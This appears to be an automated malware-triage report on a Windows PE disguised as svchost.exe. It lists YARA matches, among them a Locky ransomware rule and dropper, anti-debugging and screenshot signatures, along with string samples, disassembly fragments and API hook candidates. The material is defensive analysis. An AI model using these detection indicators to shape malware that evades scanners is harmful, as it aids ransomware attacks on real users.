| contains_base64 | - | $a@68984 len=12 |
| System_Tools | - |  |
| Dropper_Strings | - | $a0@76939 len=18 |
| Misc_Suspicious_Strings | - | $a4@77068 len=14 |
| Advapi_Hash_API | - | $advapi32@89940 len=12; $CryptCreateHash@89758 len=15; $CryptHashData@89838 len=13; $CryptAcquireContext@89592 len=19 |
| IsPE32 | - |  |
| IsWindowsGUI | - |  |
| HasRichSignature | - | $a0@200 len=4 |
| VC8_Microsoft_Corporation | - | $a@15664 len=10 |
| Microsoft_Visual_Cpp_8 | - | $a@607 len=82; $b@33965 len=10 |
| SEH_Save | - | $a@44005 len=7 |
| SEH_Init | - | $a@44062 len=6; $b@23648 len=7 |
| anti_dbg | - | $d1@77028 len=12; $c2@90574 len=17 |
| network_http | - | $f1@90264 len=11; $c1@90084 len=15; $c2@90046 len=12; $c4@90246 len=16; $c5@90170 len=17; $c6@90104 len=15; $c7@90148 len=15 |
| screenshot | - | $d1@89468 len=9; $d2@89260 len=10; $c2@89182 len=5 |
| win_registry | - | $f1@89940 len=12; $c1@89700 len=16; $c2@89616 len=13; $c3@89632 len=11; $c4@89664 len=14; $c6@89632 len=11 |
| win_token | - | $f1@89940 len=12; $c3@89796 len=16 |
| win_files_operation | - | $f1@77028 len=12; $c1@88230 len=9; $c2@88328 len=14; $c3@88230 len=9; $c4@88316 len=8 |
| Str_Win32_Wininet_Library | - | $wininet_lib@90264 len=11 |
| Str_Win32_Internet_API | - | $wininet_call_closeh@90004 len=19; $wininet_call_readf@90246 len=16; $wininet_call_connect@90084 len=15; $wininet_call_open@90046 len=12 |
| Str_Win32_Http_API | - | $wininet_call_httpr@90148 len=15; $wininet_call_httpq@90228 len=13; $wininet_call_httpo@90104 len=15 |

## Generated YARA Meta
```json
{
  "rule_count": 24,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IP",
      "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
      "strings": [
        {
          "id": "$ipv4",
          "offset": 75759,
          "length": 13,
          "xor_key": null
        },
        {
          "id": "$ipv6",
          "offset": 96935,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Locky_Ransomware_2",
      "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
      "strings": [
        {
          "id": "$a1",
          "offset": 76020,
          "length": 13,
          "xor_key": null
        },
        {
          "id": "$a2",
          "offset": 76097,
          "length": 13,
          "xor_key": null
        },
        {
          "id": "$a3",
          "offset": 76110,
          "length": 13,
          "xor_key": null
        },
        {
          "id": "$a4",
          "offset": 76123,
          "length": 13,
          "xor_key": null
        },
        {
          "id": "$a5",
          "offset": 76136,
          "length": 13,
          "xor_key": null
        },
        {
          "id": "$a6",
          "offset": 76149,
          "length": 12,
          "xor_key": null
        },
        {
          "id": "$a7",
          "offset": 76700,
          "length": 15,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "contains_base64",
      "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
      "strings": [
        {
          "id": "$a",
          "offset": 68984,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "System_Tools",
      "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
      "strings": []
    },
    {
      "rule": "Dropper_Strings",
      "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
      "strings": [
        {
          "id": "$a0",
          "offset": 76939,
          "length": 18,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Misc_Suspicious_Strings",
      "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
      "strings": [
        {
          "id": "$a4",
          "offset": 77068,
          "length": 14,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "Advapi_Hash_API",
      "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
      "strings": [
        {
          "id": "$advapi32",
          "offset": 89940,
          "length": 12,
          "xor_key": null
        },
        {
          "id": "$CryptCreateHash",
          "offset": 89758,
          "length": 15,
          "xor_key": null
        },
        {
          "id": "$CryptHashData",
          "offset": 89838,
          "length": 13,
          "xor_key": null
        },
        {
          "id": "$CryptAcquireContext",
          "offset": 89592,
          "length": 19,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IsPE32",
      "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050eb/svchost.exe",
      "strings": []
    },
    {
      "rule": "IsWindowsGUI",
      "path": "/opt/samples/corpus/malware/28046c14ea3325885ee1e731cd0bcf9f38445df02675836b851cb2ae94c050
```

## FLOSS Strings
Total strings: 554 · per_category: `{"decoded_strings": 0, "stack_strings": 0, "tight_strings": 0, "language_strings": 0, "language_strings_missed": 0, "static_strings": 554}`

### FLOSS sample
- `!This program cannot be run in DOS mode.`
- ``.rdata`
- `@.data`
- `.reloc`
- `tTh@9A`
- `SSSSSS`
- `PSWh[4@`
- `zv:j%j`
- `TSVWj@3`
- `QSSjPSSSPS`
- `PWWhP=A`
- `9D$du4`
- `6QVWWS`
- `YYhx=A`
- `D$D+D$@`
- `D$"j\Xf`
- `|$4;|$8`
- `D$$PWWWW`
- `s89D$Dw2+D$Dj`
- `!;|$Lu`
- `8;t$8u`
- `9|$4t#`
- `jXh`MA`
- `^SSSSS`
- `v	N+D$`
- `t$<"u	3`
- `< tK<	tG`
- `j@j ^V`
- `URPQQh`
- `t"SS9] u`
- `PPPPPPPP`
- `;t$,v-`
- `UQPXY]Y[`
- `QQSVWd`
- `t*=RCC`
- `;7|G;p`
- `tR99u2`
- `Unknown exception`
- `CorExitProcess`
- `HH:mm:ss`

## .NET Analysis
- is_dotnet: false (not observed)

## radare2 Disassembly (attach in Static Code Analysis)
### 0x0040ab74
```asm
┌ 329: entry0 ();
│       ╎   ; var int32_t var_4h @ ebp-0x4
│       ╎   ; var int32_t var_1ch @ ebp-0x1c
│       ╎   ; var int32_t var_20h @ ebp-0x20
│       ╎   ; var int32_t var_38h @ ebp-0x38
│       ╎   ; var int32_t var_3ch @ ebp-0x3c
│       ╎   ; var int32_t var_68h @ ebp-0x68
│       ╎   0x0040ab74      e880260000     call 0x40d1f9
│       └─< 0x0040ab79      e989feffff     jmp 0x40aa07
            ; CALL XREF from main @ 0x40420a(x)
..
```
### 0x00404044
```asm
; CALL XREF from entry0 @ 0x40ab1c(x)
┌ 2266: int main (int argc, char **argv, char **envp);
│           ; var int32_t var_10h @ ebp+0x34c
│           ; var int32_t var_4h @ ebp+0xd0
│           ; var int32_t var_14h @ ebp+0xc0
│           ; var int32_t var_15h @ ebp+0xbf
│           ; var int32_t var_28h @ ebp+0xac
│           ; var int32_t var_2ch @ ebp+0xa8
│           ; var int32_t var_30h @ ebp+0xa4
│           ; var int32_t var_54h @ ebp+0x80
│           ; var int32_t var_58h @ ebp+0x7c
│           ; var int32_t var_b0h @ ebp+0x24
│           ; var int32_t var_4h_2 @ ebp-0x4
│           ; var int32_t var_e8h @ ebp-0x14
│           ; var int32_t var_f4h @ ebp-0x20
│           ; var int32_t var_f8h @ ebp-0x24
│           ; var int32_t var_28h_2 @ ebp-0x28
│           ; var int32_t var_100h @ ebp-0x2c
│           ; var int32_t var_104h @ ebp-0x30
│           ; var int32_t var_38h @ ebp-0x38
│           ; var int32_t var_3ch @ ebp-0x3c
│           ; var int32_t var_114h @ ebp-0x40
│           ; var int32_t var_11ch @ ebp-0x48
│           ; var int32_t var_120h @ ebp-0x4c
│           ; var int32_t var_54h_2 @ ebp-0x54
│           ; var int32_t var_130h @ ebp-0x5c
│           ; var int32_t var_15h_2 @ ebp-0x5d
│           ; var int32_t var_138h @ ebp-0x64
│           ; var int32_t var_13ch @ ebp-0x68
│           ; var int32_t var_24h @ ebp-0x6c
│           ; var int32_t var_2ch_2 @ ebp-0x74
│           ; var int32_t var_14ch @ ebp-0x78
│           ; var int32_t var_154h @ ebp-0x80
│           ; var int32_t var_158h @ ebp-0x84
│           ; var int32_t var_168h @ ebp-0x94
│           ; var int32_t var_50h @ ebp-0x98
│           ; var int32_t var_58h_2 @ ebp-0xa0
│           ; var int32_t var_5ch @ ebp-0xa4
│           ; var int32_t var_60h @ ebp-0xa8
│           ; var int32_t var_64h @ ebp-0xac
│           ; var int32_t var_184h @ ebp-0xb0
│           ; var int32_t var_6ch @ ebp-0xb4
│           ; var int32_t var_70h @ ebp-0xb8
│           ; var int32_t var_74h @ ebp-0xbc
│           ; var int32_t var_78h @ ebp-0xc0
│           ; var int32_t var_7ch @ ebp-0xc4
│           ; var int32_t var_80h @ ebp-0xc8
│           ; var int32_t var_1a0h @ ebp-0xcc
│           ; var int32_t var_88h @ ebp-0xd0
│           ; var int32_t var_8ch @ ebp-0xd4
│           ; var int32_t var_90h @ ebp-0xd8
│           ; var int32_t var_94h @ ebp-0xdc
│           ; var int32_t var_1bch @ ebp-0xe8
│           ; var int32_t var_b0h_2 @ ebp-0xf8
│           ; var int32_t var_b8h @ ebp-0x100
│           ; var int32_t var_1d8h @ ebp-0x104
│           ; var int32_t var_cch @ ebp-0x114
│           ; var int32_t var_d4h @ ebp-0x11c
│           ; var int32_t var_1f4h @ ebp-0x120
│           ; var int32_t var_e8h_2 @ ebp-0x130
│           ; var int32_t var_210h @ ebp-0x13c
│           ; var int32_t var_f8h_2 @ ebp-0x140
│           ; var int32_t var_104h_2 @ ebp-0x14c
│           ; var int32_t var_22ch @ ebp-0x158
│           ; var int32_t var_114h_2 @ ebp-0x15c
│           ; var in
```

## UPX Unpack
- upx_ok: False
- is_packed: False
- returncode: None
- unpacked_path: ``

## XOR Search
- Found XOR 00 position 00000000: 000000D8 ........!..L.!This program cannot be r

## Speakeasy (dynamic)
- speakeasy_ok: True
- api_calls: 0
- key_events: 0
- duration_s: None
- **not observed**: no API calls/events recorded — do not invent runtime behavior

## Frida Probe
- frida_available: True
- version: 17.16.4
- hook_candidates:
  - `KERNEL32.dll!EnterCriticalSection`
  - `KERNEL32.dll!LeaveCriticalSection`
  - `KERNEL32.dll!GetCurrentThread`
  - `KERNEL32.dll!FindNextFileW`
  - `KERNEL32.dll!GetDiskFreeSpaceExW`
  - `USER32.dll!DrawTextW`
  - `USER32.dll!SystemParametersInfoW`
  - `USER32.dll!ReleaseDC`
  - `USER32.dll!FrameRect`
  - `USER32.dll!FillRect`
  - `GDI32.dll!CreateSolidBrush`
  - `GDI32.dll!GetDIBits`
  - `GDI32.dll!GetObjectA`
  - `GDI32.dll!SetBkMode`
  - `GDI32.dll!SetTextColor`
  - `ADVAPI32.dll!CryptCreateHash`
  - `ADVAPI32.dll!AccessCheck`
  - `ADVAPI32.dll!MapGenericMask`
  - `ADVAPI32.dll!DuplicateToken`
  - `ADVAPI32.dll!OpenThreadToken`
  - `SHELL32.dll!SHGetFolderPathW`
  - `SHELL32.dll!ShellExecuteW`
  - `WININET.dll!InternetOpenA`
  - `WININET.dll!InternetCloseHandle`
  - `WININET.dll!InternetSetOptionA`
  - `WININET.dll!HttpOpenRequestA`
  - `WININET.dll!InternetQueryOptionA`
  - `MPR.dll!WNetEnumResourceW`
  - `MPR.dll!WNetCloseEnum`
  - `MPR.dll!WNetAddConnection2W`
